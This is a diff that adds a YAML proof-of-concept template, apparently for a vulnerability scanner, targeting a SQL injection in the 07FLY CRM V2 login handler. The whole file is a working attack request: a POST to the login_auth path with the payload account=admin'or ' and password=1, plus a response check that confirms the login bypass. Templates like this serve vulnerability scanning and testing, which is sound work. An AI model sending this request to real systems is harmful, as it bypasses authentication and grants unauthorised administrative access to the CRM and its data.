@@ -1,0 +1,17 @@
+id: poc-yaml-07fly-crmv2-sql-injection
+info:
+  name: 07FLY-CRM-V2-login_auth-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 07FLYCRM
+requests:
+- method: POST
+  path: /index.php/sysmanage/Login/login_auth/
+  headers:
+    Content-Type: application/x-www-form-urlencoded;
+  data: account=admin'or ' &password=1
+  expression: status_code == 200 && contains(body, "\"statusCode\":\"200\",\"message\":\"")
+    && contains(body, "\"callbackType\":\"")
+variables: {}
+transport: http
